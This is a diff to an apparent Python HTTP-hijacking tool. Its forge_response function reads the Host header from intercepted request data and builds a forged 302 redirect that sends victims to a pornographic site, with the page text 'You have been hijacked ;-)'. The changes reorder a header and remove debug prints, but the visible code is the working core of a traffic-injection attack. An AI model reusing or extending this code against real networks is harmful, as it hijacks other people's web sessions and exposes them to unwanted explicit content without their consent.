@@ -8,8 +8,8 @@
 import re
 
 header_template = """HTTP/1.1 302 Redirect
-Connection: close
 Location: http://pornhub.com/
+Connection: close
 Content-type: text/html
 Content-length: %(contentlen)s
 
@@ -27,9 +27,6 @@ You have been hijacked ;-)
 pattern = re.compile("host: ([^\r\n]*)", re.IGNORECASE)
 
 def forge_response(data, length):
-    print "length: %d" % (length)
-    print "data:"
-    print "%s" % (data)
  
     x = pattern.search(data)
     hostname = x.group(1)
@@ -44,4 +41,4 @@ def forge_response(data, length):
     header = header_template % vars()
 
     return header + content
-  
+
